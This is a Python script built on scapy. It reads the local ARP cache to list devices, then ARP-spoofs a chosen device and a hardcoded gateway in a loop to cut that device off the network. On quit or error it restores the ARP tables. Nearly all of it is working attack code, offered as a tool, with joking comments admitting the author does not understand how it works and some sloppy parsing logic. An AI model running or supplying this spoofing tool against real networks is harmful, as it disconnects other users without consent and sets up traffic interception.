from scapy.all import Ether, ARP, get_if_hwaddr, srp, send, getmacbyip, conf, sendp
import subprocess
import re
import time
import threading

devices = []
blocked_devices = []

# I don't know how it's working xddddd
def spoof(target_ip, target_mac, spoof_ip):
    iface = conf.iface
    my_mac = get_if_hwaddr(iface)
    ether = Ether(dst=target_mac, src=my_mac)
    arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=my_mac)
    packet = ether / arp
    sendp(packet, iface=iface, verbose=False)

# I don't know how it's working xddddd
def restore(target_ip, target_mac, source_ip, source_mac):
    print(f"[+] Restoring ARP table for {source_ip}...")
    ether = Ether(dst=target_mac)
    arp = ARP(op=2, pdst=target_ip, hwdst=source_mac,
              psrc=source_ip, hwsrc=source_mac)
    packet = ether / arp
    sendp(packet, count=5, verbose=False)

def nmap_scan_network(network="192.168.0.0/24"):
    devices_list = []
    try:
        output = subprocess.check_output(["nmap", "-sP", network], text=True)
    except subprocess.CalledProcessError as e:
        print(f"Error running nmap: {e}")
        return devices_list

    lines = output.splitlines()
    ip = None
    mac = None
    for line in lines:
        # Detect IP line
        ip_match = re.match(r'Nmap scan report for ([\d\.]+)', line)
        if ip_match:
            ip = ip_match.group(1)
            mac = None  # reset mac for this ip
        
        # Detect MAC line
        # mac_match = re.match(r'MAC Address: ([\da-fA-F:]+)', line)
        mac = getmacbyip(ip)
        devices_list.append({"ip": ip, "mac": mac})
        ip = None  # reset after saving

    return devices_list




def print_devices(devices_list):
    for index, device in enumerate(devices_list):
        print(f"{index + 1}  |  {device['ip']}      {device['mac']}")
    # print("\n- Type 'r' in input to refresh")
    print("\n- Type 'q' in input to quit")


def block_device(device):
    target_ip = device['ip']
    target_mac = device['mac']
    gateway_ip = '192.168.0.1' # THIS IS HARDCODED GATEWAT, EITHER DETECT AUTOMATICALLY OR GET IT MANUALLY FROM USER
    gateway_mac = getmacbyip(gateway_ip)

    try:
        while True:
            spoof(target_ip, target_mac, gateway_ip)
            spoof(gateway_ip, gateway_mac, target_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Restoring network...")
        restore(target_ip, target_mac, gateway_ip, gateway_mac)
        restore(gateway_ip, gateway_mac, target_ip, target_mac)
        print("[+] Network restored.")


def get_arp_cache():
    output = subprocess.check_output(["arp", "-a"], text=True)
    lines = output.splitlines()
    for line in lines:
        # This regex matches IP and MAC from arp -a output line
        match = re.search(r'\(([\d\.]+)\) at ([\da-fA-F:]+)', line)
        if match:
            ip = match.group(1)
            mac = match.group(2)
            devices.append({"ip": ip, "mac": mac})
    return devices


def restore_connections():
    if len(blocked_devices) > 0:
        print("\n[!] Restoring network...")
        for device in blocked_devices:
            target_ip = device['ip']
            target_mac = device['mac']
            gateway_ip = '192.168.0.1' # THIS IS HARDCODED GATEWAT, EITHER DETECT AUTOMATICALLY OR GET IT MANUALLY FROM USER
            gateway_mac = getmacbyip(gateway_ip)
            restore(target_ip, target_mac, gateway_ip, gateway_mac)
            restore(gateway_ip, gateway_mac, target_ip, target_mac)
        
        print("[+] Network restored.")


def main():
    # Print list of devices connected to the current network
    # initially from arp cache of the operating system
    devices_list = get_arp_cache()
    print_devices(devices_list)

    while True:
        try:
            user_input = input("\nInput: ")

            # if user_input == 'r':
            #     devices_list = nmap_scan_network()
            #     print_devices(devices_list)
            #     continue
            if user_input == 'q':
                restore_connections()
                break

            # Block device
            user_input = int(user_input)
            device_to_block = devices[user_input - 1]

            print(f"[!] Starting ARP spoof to block {device_to_block['ip']}... (Ctrl+C to stop)")
            blocked_devices.append(device_to_block)
            threading.Thread(target=block_device, args=(device_to_block,), daemon=True).start()
            continue
        except KeyboardInterrupt:
            restore_connections()
        except Exception:
            restore_connections()


if __name__ == "__main__":
    main()

